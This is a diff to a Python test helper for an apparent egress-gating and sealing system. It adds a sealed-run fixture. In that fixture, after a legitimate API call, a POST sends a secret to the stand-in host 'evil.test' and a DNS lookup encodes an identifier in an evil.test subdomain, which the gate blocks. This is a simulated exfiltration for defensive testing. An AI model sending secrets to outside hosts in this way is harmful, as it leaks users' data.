@@ -159,7 +159,7 @@ def clock_from_zero():
     return f
 
 
-def make_engine(tmp_path, key, fs, violations=None):
+def make_engine(tmp_path, key, fs, violations=None, sealer=None):
     """Engine + EgressGate over a FakeFS, writing a run into tmp_path/run."""
     from poi.engine import Engine
     from poi.gate import EgressGate
@@ -171,12 +171,12 @@ def make_engine(tmp_path, key, fs, violations=None):
     pol = parse(POLICY)
     out = tmp_path / "out"
     out.mkdir(exist_ok=True)
-    eng = Engine(Ledger(tmp_path / "run", key), StateTracker(fs, (out, "/srv/out")),
+    eng = Engine(Ledger(tmp_path / "run", key), StateTracker(fs, (out, "/srv/out"), sealer=sealer),
                  WalReader(tmp_path / "run" / "proxy-wal"), LocalPublisher(tmp_path / "run"), pol,
                  {"id": "abc", "image": "sha256:img"}, clock=clock_from_zero(),
                  on_violation=(violations.append if violations is not None else lambda v: None),
                  full_scan_every=3)
-    gate = EgressGate(pol, WalWriter(tmp_path / "run" / "proxy-wal", tmp_path / "run" / "evidence"))
+    gate = EgressGate(pol, WalWriter(tmp_path / "run" / "proxy-wal", tmp_path / "run" / "evidence", sealer))
     return eng, gate
 
 
@@ -229,3 +229,30 @@ def http_call(url, method="GET", headers=None):
     except urllib.error.HTTPError as e:
         return e.code, e.headers, e.read()
 FAST_KDF = {"m_kib": 1024, "t": 1, "p": 1}       # Argon2id parameters that keep tests fast
+
+
+SEALED_EK = b"e" * 32
+
+
+def make_sealed_run(tmp_path, key, client_pub=None):
+    """Sealed run over a FakeFS. Returns (run_dir, sealer, client_sk or None when client_pub was given)."""
+    from poi.seal import kem
+    from poi.seal.sealer import Sealer, sealed_doc
+
+    client_sk = None
+    if client_pub is None:
+        client_sk, client_pub = kem.generate()
+    s = Sealer(SEALED_EK)
+    eng, gate = make_engine(tmp_path, key, FakeFS(ENGINE_IMAGE, ENGINE_MOUNTS), sealer=s)
+    run = tmp_path / "run"
+    run.mkdir(exist_ok=True)
+    (run / "policy.yaml").write_bytes(POLICY)
+    (run / "sealed.json").write_bytes(sealed_doc(SEALED_EK, client_pub, "r1", b"run-pub"))
+    eng.genesis()
+    r = gate.on_request("api.example.com", "POST", "/v1/score", [], b'{"model":"small","count":1}')
+    gate.on_response(r.seq, 200, [("content-type", "application/json")], b'{"score":0.5}')
+    gate.on_request("evil.test", "POST", "/c/85010112345", [], DASH_SECRET)
+    gate.wal.record_dns(T0, "85010112345.evil.test", "A", "block")
+    (tmp_path / "out" / "r.txt").write_bytes(b"result")
+    eng.tick()
+    return run, s, client_sk
